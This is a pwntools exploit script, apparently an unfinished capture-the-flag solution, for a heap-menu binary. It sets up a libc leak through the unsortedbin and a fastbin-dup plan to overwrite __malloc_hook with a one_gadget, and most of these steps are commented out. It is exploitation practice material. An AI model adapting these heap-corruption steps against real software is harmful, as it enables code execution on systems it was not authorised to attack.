#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./original_old_patched")
libc = ELF("./libc.so.6")

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
libc_offset = 0x3c4b78 # Calculated by leaking unsortedbins with no aslr and calculating distance to libc base
one_offset = 0xd2587 # one_gadget <libc>
malloc_hook_offset = 0x3c4b10 # found using objdump -T <libc> | grep __malloc_hook

# Functions
def malloc(size: int, index: int):
    io.sendline(b"1")
    io.sendlineafter(b"idx: ", f"{index}".encode())
    io.sendlineafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")

def free(index: int):
    io.sendline(b"2")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"> ")

def write(content: bytes, index: int):
    io.sendline(b"3")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.sendlineafter(b"contents: ", content)
    io.recvuntil(b"> ")

def view(index: int):
    io.sendline(b"4")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"data: ")
    leak = io.recvuntil(b"[")
    io.recvuntil(b"> ")
    return leak

io = start()

"""
# 1. Libc leak
# Exhaust tcache and put into unsortedbin
for i in range(8):
    malloc(0x88, i)

for i in range(7):
    free(i)

# free the last allocted 0x88 chunk
free(7)
view(7)

# Exhaust tcache

for i in range(11): # 0-7 including
    malloc(0x20, i)

for i in range(7): # 0-6 including. 7 elements total which is what the tcache can bear
    free(i)

# 0-6 in tcache
free(7) # fbin 0
free(8) # fbin 1
free(7) # fbin 0, fastbin dup accomplished
"""
malloc(0x10, 0)
malloc(0x10, 1)
free(1)



"""
malloc(0x80) # 0
malloc(0x20) # 1, guard chunk to prevent top chunk consolidation

free(0) # Put 0 into unsortedbin
leak = view(0)
libc_leak = view(0).rstrip(b"[")
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
log.info("libc leak: %s" % hex(libc_leak))
libc_base = libc_leak - libc_offset
log.info("libc base: %s" % hex(libc_base))


one_gadget = libc_base + one_offset
malloc_hook = libc_base + malloc_hook_offset

"""
# 2. Fastbin dup
#malloc(0x80) # Old chunk, idx 2. Requested from unsortedbin, so we don't get it with the next malloc
#malloc(0x68) # A idx 3
#malloc(0x68) # B idx 4

#free(3) # A idx 3 : A linked into fastbin
#free(4) # B idx 4 : B linked into fastbin
#free(3) # A idx 3 : A linked into fastbin again

#malloc(0x68) # 5
#write(p64(malloc_hook-35), 5)
#malloc(0x68) # 6
#malloc(0x68) # 7 Put malloc_hook-35 into fastbin 0x70

io.interactive()
